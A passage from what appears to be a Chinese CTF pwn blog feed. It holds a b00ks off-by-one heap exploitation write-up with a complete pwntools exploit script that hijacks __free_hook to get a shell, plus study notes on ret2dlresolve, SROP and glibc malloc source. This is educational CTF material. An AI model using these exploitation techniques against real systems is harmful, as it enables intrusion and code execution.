description。</p><p>上半部分是book1结构体，下半部分是book2结构体。</p><p>作者名读入的\x00可以覆盖结构体指针的低位，程序后还有修改作者名的功能，那么可以直接通过修改作者名将结构体指针的低位覆盖为0，那么0x555555603770就会被修改为0x555555603700。验证一下：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331039.png" alt="image-20231111171352926"></p><p>修改成功。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331401.png" alt="image-20231111185139988"></p><h4 id="伪造结构体"><a href="#伪造结构体" class="headerlink" title="伪造结构体"></a>伪造结构体</h4><p>运用change_author_name的功能，可以重新溢出一个字节‘\00’，然后global_struct_array中的第一个元素的地址改变，可以通过为book1_description申请大一点的空间，来使的被修改后 global_struct_array中的第一个元素的地址指向book1_description内的地址，然后我们可以在相应的地址重新伪造一个book1_struct。因为有print description以及edit description的功能，所以我们通过伪造book1_struct的description使其指向任意地址，通过打印或者edit来实现任意地址的读写。</p><p>接下来要在book1_description中伪造一个 book1_struct，让book1_struct指针指向book1_description中；然后在book1_description中伪造一个book1_struct，使得其中的book1_description_ptr指向book2_description_ptr；通过先后修改book1_description和 book2_description，从而实现任意地址写任意内容的功能。</p><p>所以在之前创建book_struct时，book1 的 description 的大小要尽量大一点 ，是为了保证当单字节溢出后 book1_struct 指针落在 book1 的 description 中，从而对其可控。book2 的 description 的大小为 0x21000（135168），这样会通过 mmap () 函数去分配堆空间，而该堆地址与 libc 的基址相关，这样通过泄露该堆地址可以计算出 libc 的基址。</p><p>伪造的结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">id=<span class="number">1</span>; </span><br><span class="line">book_name = book2_struct_name;( book2_struct+<span class="number">8</span>)</span><br><span class="line">description = book2_struct_name;</span><br><span class="line">description_size = <span class="number">0xffff</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接修改数据，构造结构体</p><p>set {unsigned long long}0x555555603710 &#x3D; 0x00005555556037b0</p><p>set {unsigned long long}0x555555603708 &#x3D; 0x00005555556037a8</p><p>set *0x555555603700 &#x3D; 0x1</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331437.png" alt="image-20231111194209974"></p><p>构造好后继续运行看执行情况</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331484.png" alt="image-20231111194308346"></p><p>可以看到将book2_name和book2_desc打印出来了</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222331532.jpg" alt="2"></p><h4 id="计算libc基地址、freehook、onegadget"><a href="#计算libc基地址、freehook、onegadget" class="headerlink" title="计算libc基地址、freehook、onegadget"></a>计算libc基地址、freehook、onegadget</h4><p>vmmap寻找libc，可读可执行的就就是要找的</p><p>选择book2_name_addr或book2_des_addr其中一个计算偏移，得到基地址就可以利用pwntools查找函数了。</p><p>由于该程序启用了 <code>FULL RELRO</code> 保护措施，无法对 <code>GOT</code> 进行改写，但是可以改写<code>__free_hook</code> 或<code>__malloc_hook</code>，来实现劫持程序流。</p><blockquote><p>在调用malloc或者free的时候，如果 malloc_hook 和free_hook的值存在，则会调用malloc_hook或者free_hook指向的地址，假设在使用one_gadget的时候满足one_gadget的调用条件，当overwrite malloc_hook和free_hook的时候，便可以getshell，执行malloc的时候，其参数是size大小，所以overwrite malloc_hook的时候使用one_gadget的地址可以getshell。执行free的时候，可以将__free_hook的值overwrite为system的地址，通过释放(&#x2F;bin&#x2F;sh\x00)的chunk，可以达到system(&#x2F;bin&#x2F;sh)来getshell</p></blockquote><p>找到gadgets后，可以先向伪造的结构体的desc中写入free_hook，然后向book2的desc中写入onegadget。而伪造的结构体指向book2的name，所以当调用删除函数时，会首先调用free释放book2指向的地址，原本的free(book2_name_ptr)会变为system(binsh_addr)。</p><p>通过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line"></span><br><span class="line">edit_book(target, <span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure><p>将改写fake_book1中的description的内容，因为description指向的是book2_name，也就是说 payload &#x3D; p64(binsh_addr) + p64(free_hook)将覆盖book2_name以及book2_description。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(system)</span><br><span class="line">edit_book(target, <span class="number">2</span>, payload)</span><br></pre></td></tr></table></figure><p>这里是edit book2_description，因为book2_description被覆盖为free_hook()的地址信息，因此此操作时将free_hook指向system。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">hollk = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">        hollk.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        hollk.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        hollk.sendline(name)</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        hollk.sendline(<span class="built_in">str</span>(des_size))</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        hollk.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">        hollk.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">id</span>):</span><br><span class="line">                book_id = <span class="built_in">int</span>(hollk.readline()[:-<span class="number">1</span>])</span><br><span class="line">                hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">                book_name = hollk.readline()[:-<span class="number">1</span>]</span><br><span class="line">                hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">                book_des = hollk.readline()[:-<span class="number">1</span>]</span><br><span class="line">                hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">                book_author = hollk.readline()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createname</span>(<span class="params">name</span>):</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">        hollk.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">        hollk.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        hollk.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id,new_des</span>):</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">        hollk.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        hollk.writeline(<span class="built_in">str</span>(book_id))</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        hollk.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">        hollk.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        hollk.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        hollk.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line">     </span><br><span class="line">createname(<span class="string">&quot;12345678123456781234567812345678&quot;</span>)</span><br><span class="line">createbook(<span class="number">128</span>, <span class="string">&quot;hollk_boo1&quot;</span>, <span class="number">32</span>, <span class="string">&quot;hollk_desc1&quot;</span>)</span><br><span class="line">createbook(<span class="number">0x21000</span>, <span class="string">&quot;hollk_boo2&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;hollk_desc2&quot;</span>)</span><br><span class="line">        </span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book1_addr = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(book1_addr+<span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">editbook(book_id_1,payload)</span><br><span class="line">changename(<span class="string">&quot;12345678123456781234567812345678&quot;</span>)</span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book2 name addr:&quot;</span> + <span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line">log.success(<span class="string">&quot;book2 des addr:&quot;</span> + <span class="built_in">hex</span>(book2_des_addr))</span><br><span class="line">libc_base = book2_des_addr - <span class="number">0x5b7010</span></span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">one_gadget = libc_base+<span class="number">0x50a37</span> <span class="comment">#0xebcf8、0xebcf5、0xebcf1、0x50a37</span></span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">editbook(<span class="number">1</span>, p64(free_hook))</span><br><span class="line">editbook(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(hollk)</span></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line">hollk.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#3-balsn_ctf_2019-plaintext">堆中的 Off-By-One - CTF Wiki (ctf-wiki.org)</a></p></li><li><p>CTF竞赛权威指南-pwn篇</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Overflow-高级ROP</title>
      <link href="/article/6533.html"/>
      <url>/article/6533.html</url>
      
        <content type="html"><![CDATA[<h1 id="Stack-Overflow-高级ROP"><a href="#Stack-Overflow-高级ROP" class="headerlink" title="Stack Overflow - 高级ROP"></a>Stack Overflow - 高级ROP</h1><p>只有一部分，基础不太好，等基础学完再填坑。</p><h2 id="ret2dlreslove"><a href="#ret2dlreslove" class="headerlink" title="ret2dlreslove"></a>ret2dlreslove</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>之前学习过ELF使用了延迟绑定，基本思想就是当函数第一次被调用的时候才进行绑定(符号查找、重定位等)。</p><p>在Linux中，程序使用<code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 来对动态链接的函数进行重定位。如果可以控制相应的参数及其对应地址内容就可以控制解析的函数。要注意的是，32位的reloc_arg和64位的有区别：32位使用reloc_offset, 64位使用reloc_index。</p><p>具体一点，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 <code>.dynamic</code> 索引得到的。如果可以修改其中的某些内容，使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。</p><p>在linux下，二进制引用的外部符号加载方式有三种，FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在PARTIAL_RELRO和NO_RELRO的情况下，外部符号的地址延迟加载。在 NO_RELRO 设置中，全局偏移表 (GOT) 中的所有条目均为可写；在 PARTIAL_RELRO 设置中，只有部分全局偏移表 (GOT) 条目在动态链接器解析符号后被设置为只读，其他条目仍然可写；使用 FULL_RELRO 设置时，在动态链接器解析所有符号之后，整个全局偏移表 (GOT) 都会被设置为只读。这意味着任何试图覆写 GOT 条目的尝试都会导致段错误，防止攻击者通过函数指针劫持控制流或操纵共享库行为。</p><h3 id="dl-runtime-resolve函数具体运行模式"><a href="#dl-runtime-resolve函数具体运行模式" class="headerlink" title="_dl_runtime_resolve函数具体运行模式"></a>_dl_runtime_resolve函数具体运行模式</h3><p>_dl_runtime_resolve函数如何使程序第一次调用一个函数：</p><ol><li>首先用link_map访问.dynamic，分别取出.dynstr、 .dynsym、 .rel.plt的地址；</li><li>.rel.plt + 参数reloc_index，求出当前函数的重定位表项Elf32_Rel的指针，记作rel;</li><li>rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;</li><li>.dynstr + sym -&gt; st_name得出符号名字符串指针;</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给*rel -&gt; r_offset，即GOT表;</li><li>最后调用这个函数</li></ol><p>通过一个示例来解释：</p><p>题目来源：XDCTF2015-pwn200</p><p>在0x080485b4处下断点，然后si进入call strlen@plt;</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904611.png" alt="image-20230801142532701"></p><p>进去后能看到首先会执行下面那一部分</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904600.png" alt="image-20230801155644489"></p><p>对应之前说的，跳转到自己的plt表项，可以查看jmp的地址存的是什么</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904620.png" alt="image-20230801142743720"></p><p>存的其实就是下一条指令</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904621.png" alt="image-20230801142845668"></p><p>接着单步执行，会先push进去一个0x10，然后jmp</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904626.png" alt="image-20230801142918804"></p><p>jmp的就是它的公共plt表项</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904629.png" alt="image-20230801142955886"></p><p>push后jmp，jmp跳到了<code>_dl_runtime_resolve</code>这个函数的地址</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904027.png" alt="image-20230801143016416"></p><p>中间push了两次，第一次是<code>push 0x10</code>，第二次是<code>push DWORD PTR ds:0x804a004</code></p><p>查看0x804a004存放的是什么：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904044.png" alt="image-20230801143206089"></p><p>存放的是link_map的地址，通过这个地址能够找到.dynamic的地址，第三个就是.dynamic的地址</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904062.png" alt="image-20230801143302425"></p><p>通过这个地址能够找到.dynstr和.dynsym和.rel.plt的地址</p><blockquote><p>.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x08048278</p><p>.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481d8</p><p>.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048330</p></blockquote><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904078.png" alt="image-20230801143437083"></p><p>.rel.plt的地址加上参数reloc_arg就是函数重定向表项Elf32_Rel的指针，记作rel</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904094.png" alt="image-20230801143853477"></p><p>通过这个 rel 可以得到以下信息</p><blockquote><p>r_offset &#x3D; 0x0804a014  &#x2F;&#x2F;指向GOT表的指针</p><p>r_info &#x3D; 0x00000407</p></blockquote><p>将r_info &gt;&gt; 8，即0x00000407 &gt;&gt;8 &#x3D; 4作为.dynsym中的下标，这里的 “&gt;&gt;” 意思是右移</p><p>我们来到 0x080481d8（上面找到的那个 .dynsym 的地址）看一下，在标号为 4 的地方，就是函数名称的偏移：name_offset</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904111.png" alt="image-20230801144045059"></p><p>.dynstr + name_offset 就是这个函数的符号名字符串 st_name</p><p>0x08048278 + 0x20 -&gt; 0x8048298‬</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904323.png" alt="image-20230801144307804"></p><p>最后在动态链接库查找这个函数的地址，并且把地址赋值给 *rel -&gt; r_offset，即 GOT 表就可以了</p><p>整理一下</p><ul><li>dl_runtime_resolve 需要两个参数，一个是 reloc_arg，就是函数自己的 plt 表项 push 的内容，一个是link_map，这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic的地址</li><li>而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些节的地址</li><li>.rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info</li><li>将 r_info&gt;&gt;8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset，右移八位是因为r_info高位表示索引，所以要右移八位</li><li>.dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名</li><li>在动态链接库里面找这个函数的地址，赋值给 *rel-&gt;r_offset，也就是 GOT 表就完成了一次函数的动态链接</li></ul><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904336.jpg" alt="yuque_diagram"></p><p>上面的分析可以得出，如果控制相应的参数及其对应地址内容就可以控制解析的函数。动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 <code>.dynamic</code> 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。</p><h3 id="保护措施和攻击"><a href="#保护措施和攻击" class="headerlink" title="保护措施和攻击"></a>保护措施和攻击</h3><p>在学习攻击之前，先复习一下RELRO保护。</p><p>前面学习过延迟绑定，简言之就是符号解析只发生在第一次调用时，通过PLT表进行，解析后相应的GOT表条目就会被修改为正确的函数地址，在这种情况下，.got.plt必须是可写的。</p><p>RELRO能够将符号重定位表设置为只读，或者在程序启动时就绑定所有的动态符号，从而避免GOT上的地址被篡改。</p><ul><li>partial PELRO：包括.dynamic和.got等的一些段在初始化后会被标记为只读</li><li>Full RELRO：除了partial PELRO，延迟绑定会被禁止（有的文章说是惰性解析，问了AI说延迟绑定是一种特定的惰性解析技术，这里就暂时先理解为延迟绑定吧），所有的导入符号将在开始时被解析，.got.plt 段会被完全初始化为目标函数的终地址，并被mprotect标记为只读。GOT[1] 与 GOT[2] 条目即link_map和_dl_runtime_reolve的地址将不会被装入。</li></ul><h4 id="思路一——直接控制重定位表项的相关内容"><a href="#思路一——直接控制重定位表项的相关内容" class="headerlink" title="思路一——直接控制重定位表项的相关内容"></a>思路一——直接控制重定位表项的相关内容</h4><p>根据上面的分析，其实最终解析符号地址时是依据符号的名字，那如果直接修改.dynstr的内容就可以执行我们想要的函数。比如write改成system。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。如果可以控制程序执行流，那么就可以伪造合适的重定位偏移从而达到调用目标函数的目的。</p><h4 id="思路二——间接控制重定位表项的相关内容"><a href="#思路二——间接控制重定位表项的相关内容" class="headerlink" title="思路二——间接控制重定位表项的相关内容"></a>思路二——间接控制重定位表项的相关内容</h4><p>可以修改动态节中的内容，能够控制带解析符号对应的字符串，从而达到执行目标函数的目的。</p><h4 id="思路三——伪造-link-map"><a href="#思路三——伪造-link-map" class="headerlink" title="思路三——伪造 link_map"></a>思路三——伪造 link_map</h4><p>由于动态链接器在解析符号地址时，主要依赖link_map来查询相关表项的地址，因此如果可以成功伪造link_map，也就可以控制程序执行目标函数。</p><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><h4 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h4><h4 id="计算reloc-arg"><a href="#计算reloc-arg" class="headerlink" title="计算reloc_arg"></a>计算reloc_arg</h4><p><code>objdump -s -j .rel.plt ./main</code></p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904354.png" alt="image-20230804203831278"></p><p><code>reloc_arg = fake_rel_plt_addr - 0x8048324</code>，得到伪造的 .rel.plt 节段在程序中的实际地址</p><h4 id="计算r-info"><a href="#计算r-info" class="headerlink" title="计算r_info"></a>计算r_info</h4><p><code>n = (欲伪造的地址- .dynsym 基地址) / 0x10</code>，其中<code>dynsym_base_addr</code> 是 <code>.dynsym</code> 节段在内存中的起始地址，<code>0x10</code> 是每个符号表项的大小。</p><p><code>r_info = n&lt;&lt;8</code>，将 <code>n</code> 左移 8 位，得到最终的 r_info 值</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904370.png" alt="image-20230804205712057"></p><p>还需要过#define ELF32_R_TYPE(val)  ((val) &amp; 0xff)宏定义，ELF32_R_TYPE(r_info)&#x3D;7，因此</p><p><code>r_info = r_info + 0x7</code></p><h4 id="计算name-offset"><a href="#计算name-offset" class="headerlink" title="计算name_offset"></a>计算name_offset</h4><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221904386.png" alt="image-20230804211455184"></p><p><code>st_name = fake_dynstr_addr - 0x804821c</code>，计算函数名在 <code>.dynstr</code> 节段中的偏移量。</p><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>复现完填坑</p><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>SROP（Sigreturn Oriented Programming），sigreturn是一个系统调用，在 unix 系统发生 signal 的时候会被间接调用</p><p>当系统进程发起（deliver）一个 signal 的时候，该进程会被短暂的挂起（suspend），进入内核①，然后内核对该进程保留相应的上下文，跳转到之前注册好的 signal handler 中处理 signal②，当 signal 返回后③，内核为进程恢复之前保留的上下文，恢复进程的执行④</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221905248.png"></p><p>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221905134.png"></p><p>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。</p><ol><li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的</li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame</li></ol><h3 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h3><ol><li><p>假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame。当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。</p></li><li><p>如果需要执行函数，那么可以<strong>控制栈指针</strong>或者<strong>把原来的RIP指向的syscall gadget换成syscall; ret gadget</strong></p></li></ol><p>构造 ROP 攻击的时候，需要满足:</p><ol><li>可以通过栈溢出来控制栈的内容</li><li>需要知道相应的地址：”&#x2F;bin&#x2F;sh” Signal Frame syscall sigreturn</li><li>需要有够大的空间来塞下整个 sigal frame</li></ol><h3 id="示例复现"><a href="#示例复现" class="headerlink" title="示例复现"></a>示例复现</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/">ret2dlresolve - CTF Wiki (ctf-wiki.org)</a></p></li><li><p><a href="https://blog.csdn.net/qq_36495104/article/details/106061223">详细解析ret2_dl_runtime_resolve_.rel.plt结构体含义-CSDN博客</a></p></li><li><p>[<a href="https://bbs.kanxue.com/thread-250703.htm">原创]ROP高级用法之ret2_dl_runtime_resolve-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap Exploitation-内存的分配</title>
      <link href="/article/ea72.html"/>
      <url>/article/ea72.html</url>
      
        <content type="html"><![CDATA[<h1 id="Heap-Exploitation-libc-malloc源码分析"><a href="#Heap-Exploitation-libc-malloc源码分析" class="headerlink" title="Heap Exploitation - _libc_malloc源码分析"></a>Heap Exploitation - _libc_malloc源码分析</h1><h2 id="堆初始化"><a href="#堆初始化" class="headerlink" title="堆初始化"></a>堆初始化</h2><p>堆初始化是在用户第一次申请内存时执行 malloc_consolidate 再执行 malloc_init_state 实现的。</p><p>malloc_consolidate函数是定义在malloc.c中的一个函数，用于将fastbin中空闲的chunk合并整理到 unsorted_bin 中以及进行初始化堆的工作。该函数是free的一个小的变体，专门用于处理fastbin中的空闲chunk，并且负责堆管理中的初始化工作。</p><p>malloc_state 的初始化操作由函数 malloc_init_state(av) 完成，该函数先初始化除 fastbins 之外的所有的bins，再初始化 fastbins，清空 fastbins。判断当前 malloc_state 结构体中的 fastbin 是否为空，如果为空就说明整个 malloc_state 都没有完成初始化，需要对malloc_state 进行初始化。</p><p>源码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate 是 free() 的一个专用版本，用于处理 fastbins 中的内存块。不能使用 free() 本身来执行此操作，因为它可能会将内存块重新放回 fastbins 中。因此，我们需要使用同样代码的一个小变体。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  此外，由于此例程需要在通过 malloc 第一次调用时进行初始化，因此它恰好是触发初始化代码的理想位置。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* 当前正在合并的 fastbin */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* 最后一个 fastbin（用于循环控制） */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* 当前正在合并的块 */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* 下一个要合并的块 */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* 未排序 bin 头 */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* 要链接到的块 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 这些变量与 free() 中的用途相同 */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果 max_fast 为 0，我们知道 av 尚未初始化，因此在下面进行初始化</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/*get_max_fast()宏定义*/</span></span><br><span class="line"></span><br><span class="line">  <span 